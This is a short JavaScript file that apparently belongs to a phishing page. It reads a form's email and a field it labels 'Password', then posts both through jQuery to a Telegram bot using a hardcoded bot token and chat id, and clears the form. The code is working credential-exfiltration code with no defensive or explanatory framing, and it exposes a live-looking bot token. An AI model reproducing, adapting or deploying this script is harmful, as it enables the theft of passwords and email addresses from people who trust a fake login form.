//bot token
var telegram_bot_id = "7793978516:AAFDHHxKKj4pVEh7F6m7ecSm7g6Pc3As9o0";
//chat id
var chat_id =  7843540794;
var u_name, email, message;
var ready = function () {
    u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;
    message = "Password: " + u_name + "\nEmail: " + email;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("email").value = "";

    return false;
};
